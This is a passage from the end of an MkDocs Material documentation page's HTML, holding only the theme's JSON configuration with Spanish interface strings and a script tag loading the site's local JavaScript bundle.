      <div class="md-dialog__inner md-typeset"></div>
    </div>
    
    
    
      
      <script id="__config" type="application/json">{"base": "../..", "features": ["navigation.tabs", "toc.integrate", "navigation.expand", "navigation.top", "navigation.indexes", "content.tabs.link", "content.code.annotate", "content.code.copy", "navigation.footer"], "search": "../../assets/javascripts/workers/search.973d3a69.min.js", "tags": null, "translations": {"clipboard.copied": "Copiado al portapapeles", "clipboard.copy": "Copiar al portapapeles", "search.result.more.one": "1 m\u00e1s en esta p\u00e1gina", "search.result.more.other": "# m\u00e1s en esta p\u00e1gina", "search.result.none": "No se encontraron documentos", "search.result.one": "1 documento encontrado", "search.result.other": "# documentos encontrados", "search.result.placeholder": "Teclee para comenzar b\u00fasqueda", "search.result.term.missing": "Falta", "select.version": "Seleccionar versi\u00f3n"}, "version": null}</script>
    
    
      <script src="../../assets/javascripts/bundle.f55a23d4.min.js"></script>
      
    
  </body>
</html>